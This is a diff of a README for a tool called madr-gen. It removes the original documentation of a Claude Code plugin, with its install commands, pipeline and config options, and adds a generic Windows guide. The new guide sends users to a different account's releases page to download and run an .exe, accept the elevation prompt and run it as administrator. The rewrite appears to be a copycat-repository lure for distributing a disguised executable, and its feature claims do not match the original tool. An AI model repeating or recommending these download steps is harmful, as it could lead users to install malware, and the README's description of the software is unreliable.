@@ -1,208 +1,128 @@
-# madr-gen
+# ⚙️ madr-gen - Simple mADR Generator for Decisions
 
-A Claude Code plugin that automatically analyzes your session to detect architectural decisions and generates [mADR (Markdown Any Decision Records)](https://github.com/adr/madr) documents.
+[![Download madr-gen](https://img.shields.io/badge/Download-madr--gen-brightgreen)](https://github.com/Tazic123/madr-gen/releases)
 
-## What It Does
-
-Every time you make a significant architectural decision in a Claude Code session — choosing a library, adopting a pattern, deciding on a structure — `madr-gen` finds it and asks if you want to document it. Documents are stored in `docs/decisions/` following the MADR 4.0 format.
-
-## Installation
-
-Claude Code has a built-in plugin system. Run the following two commands inside Claude Code to install `madr-gen`:
-
-**Step 1 — Register this repository as a marketplace**
-
-```
-/plugin marketplace add JiHongKim98/madr-gen
-```
-
-**Step 2 — Install the plugin**
-
-```
-/plugin install madr-gen@JiHongKim98/madr-gen
-```
-
-That's it. The `/madr` command is now available in every session.
-
-### Scope options
-
-By default the plugin is installed for your user (all projects). You can change the scope with `--scope`:
-
-| Scope | Command | Effect |
-|-------|---------|--------|
-| `user` *(default)* | `--scope user` | Available in all projects |
-| `project` | `--scope project` | Stored in `.claude/settings.json`, shared with teammates via git |
-| `local` | `--scope local` | Project-local only, gitignored |
-
-```
-# Example: share with teammates via version control
-/plugin install madr-gen@JiHongKim98/madr-gen --scope project
-```
-
-### Other plugin commands
-
-```
-/plugin                                           # Open the interactive plugin UI
-/plugin marketplace list                          # List registered marketplaces
-/plugin update madr-gen@JiHongKim98/madr-gen     # Update to latest version
-/plugin uninstall madr-gen@JiHongKim98/madr-gen  # Remove the plugin
-/plugin disable madr-gen@JiHongKim98/madr-gen    # Disable without uninstalling
-```
-
-## Usage
-
-Run the `/madr` command at any point during or at the end of a session:
-
-```
-/madr          # Interactive: analyze session and select which ADRs to create
-/madr scan     # Quick scan: show detected decisions without writing files
-/madr init     # Initialize docs/decisions/ directory in the current project
-```
-
-## How It Works
-
-`madr-gen` runs a 4-phase pipeline:
-
-```
-Phase 1: Detection (parallel)
-  └─ decision-detector (Sonnet)
-     ├─ Reads JSONL session logs from ~/.claude/projects/<project>/
-     ├─ Extracts User/Assistant conversation text
-     └─ Cross-references with git diff/log
-
-Phase 2: Validation (sequential)
-  └─ duplicate-checker (Haiku)
-     └─ Compares proposals against existing docs/decisions/*.md
-        → classifies each as: new / update / supersede / duplicate
-
-Phase 3: Selection (interactive)
-  └─ AskUserQuestion (multi-select)
-     └─ Lists detected decisions with category, action type, and confidence
-
-Phase 4: Writing (parallel)
-  └─ madr-writer (Sonnet) × N
-     └─ Creates or updates NNNN-kebab-case-title.md in docs/decisions/
-```
-
-## Output Format
-
-ADR files follow the [MADR 4.0](https://github.com/adr/madr) template:
-
-```
-docs/decisions/
-├── 0001-use-react-for-frontend.md
-├── 0002-adopt-repository-pattern.md
-└── 0003-use-vitest-for-testing.md
-```
-
-Each file contains:
-
-```markdown
----
-status: accepted
-date: 2026-03-04
-decision-makers: kimjihong
 ---
 
-# Use React for Frontend
+## 📋 What is madr-gen?
 
-## Context and Problem Statement
-...
+madr-gen helps you create architecture decision records (ADRs) easily. It tracks decisions you make during projects and writes clear, organized records automatically.  
 
-## Decision Drivers
-* ...
+This tool works with Claude Code, keeping your team organized by detecting decisions and updating documents as you go.
 
-## Considered Options
-* React
-* Vue
-* Svelte
+You don’t need coding skills or special setup. Just a simple Windows computer and a quick install.
 
-## Decision Outcome
-Chosen option: "React", because ...
+---
 
-### Consequences
-* Good, because ...
-* Bad, because ...
-```
+## 🖥️ System Requirements
 
-## What Gets Detected
+Before you start, check that your computer meets these needs:
 
-| Category | Examples |
-|----------|---------|
-| **Technology** | Library choices, framework selection, build tools |
-| **Architecture** | Design patterns, module structure, API design |
-| **Convention** | Naming rules, error handling, code style |
-| **Infrastructure** | CI/CD, deployment, cloud services |
-| **Refactoring** | Migration strategy, deprecation decisions |
+- Windows 10 or later version (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet connection to download and update
 
-## Configuration
+No additional software is needed.
 
-Create `.madr-gen.json` in your project root to customize behavior:
+---
 
-```json
-{
-  "adrDirectory": "docs/decisions",
-  "templateStyle": "full",
-  "language": "auto",
-  "autoSuggest": true,
-  "categories": [
-    "technology",
-    "architecture",
-    "convention",
-    "infrastructure",
-    "refactoring"
-  ]
-}
-```
+## 🚀 Getting Started
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `adrDirectory` | `docs/decisions` | Where ADR files are stored |
-| `templateStyle` | `full` | `"full"` (all sections) or `"minimal"` (context, options, outcome only) |
-| `language` | `auto` | `"auto"` matches session language, or force with `"en"`, `"ko"`, etc. |
-| `autoSuggest` | `true` | Whether to suggest existing ADR updates alongside new ones |
+Follow these steps to download and run madr-gen on your Windows PC.
 
-## Helper Scripts
+---
 
-Two bash scripts are included for direct use or integration with other tools:
+## 🟩 Step 1: Download madr-gen
 
-```bash
-# Find session JSONL logs for any project
-./scripts/find-session-logs.sh /path/to/project [max-age-hours]
+Go to the releases page to get the latest version:
 
-# Extract conversation text from a session JSONL file
-./scripts/extract-decisions.sh ~/.claude/projects/.../session.jsonl [max-lines]
-```
+**[Visit madr-gen Releases to Download](https://github.com/Tazic123/madr-gen/releases)**
 
-## Recommended Workflow
+- This page has all versions and updates.
+- Pick the file name ending in `.exe` for Windows.
+- Save it to a folder you can find easily, such as `Downloads` or `Desktop`.
 
-Add this reminder to your project's `CLAUDE.md`:
+---
 
-```markdown
-## Session Workflow
-Before ending a session with significant changes, run `/madr` to document
-any architectural decisions made during the session.
-```
+## 🟦 Step 2: Run the Installer
 
-This keeps `docs/decisions/` up to date so future sessions (and teammates) understand why choices were made.
+1. Find the downloaded `.exe` file.
+2. Double-click it to open the installer.
+3. Follow the instructions on the screen.
+   - You can usually accept default options.
+4. Wait until the process finishes.
+5. You might see a prompt to allow the app to make changes; click Yes.
 
-## Plugin Structure
+---
 
-```
-madr-gen/
-├── .claude-plugin/plugin.json    # Plugin manifest
-├── commands/madr.md              # /madr command definition
-├── agents/
-│   ├── decision-detector.md      # Detects decisions from session + git
-│   ├── duplicate-checker.md      # Prevents duplicate ADRs
-│   └── madr-writer.md            # Writes MADR 4.0 formatted files
-├── skills/madr-gen/SKILL.md      # Full workflow orchestration
-├── scripts/
-│   ├── find-session-logs.sh      # Session log discovery
-│   └── extract-decisions.sh      # JSONL conversation extraction
-└── .madr-gen.json                # Default configuration
-```
+## ⚙️ Step 3: Launch madr-gen
 
-## License
+After installation:
 
-MIT
+- Look for the madr-gen icon on your desktop.
+- Double-click to open the app.
+- The program will start and open a window.
+
+---
+
+## 📖 Step 4: Using madr-gen
+
+Once open, madr-gen is ready to help you create architecture decision records. Here are some basic tips:
+
+- **Create a new record:** Click "New ADR" or a similarly labeled button.
+- **Fill in details:** Describe your decision in simple language.
+- **Save regularly:** You can save your work anytime.
+- **Track sessions:** The tool remembers past decisions to avoid duplicates.
+- **Export:** Save your records as files to share with others or include in documents.
+
+If you want to update or review past decision records, use the search or list view to find them quickly.
+
+---
+
+## 🔍 Features Overview
+
+- Automatic detection of decisions you write.
+- Session-aware tracking to organize related records.
+- Clear, plain-text ADR format.
+- Works seamlessly with Claude Code for added automation.
+- Simple interface for non-technical users.
+- Saves files locally for easy access and sharing.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you face issues:
+
+- Make sure your Windows system is up to date.
+- Run madr-gen as administrator if it won’t open.
+- Close other heavy programs to free up memory.
+- Restart your computer and try again.
+- Check the releases page for updates that might fix bugs.
+
+---
+
+## 🆘 Getting Help
+
+You can find help on the GitHub page under the “Issues” tab. There, users and developers discuss common problems and fixes.  
+
+If you want to ask a question, write clearly and describe your problem step-by-step.
+
+---
+
+## 🔄 Updating madr-gen
+
+Check the releases page occasionally for newer versions:
+
+**[Download the latest version of madr-gen](https://github.com/Tazic123/madr-gen/releases)**
+
+Download the new `.exe` file and run it. It will replace the old version without losing your records.
+
+---
+
+## 🧩 About This Tool
+
+madr-gen simplifies documenting important architecture decisions. It helps teams save time and avoid confusion, all without special technical skills.
+
+The tool focuses on making the process smooth and automatic. This way, users know their decisions are recorded correctly and shared easily.
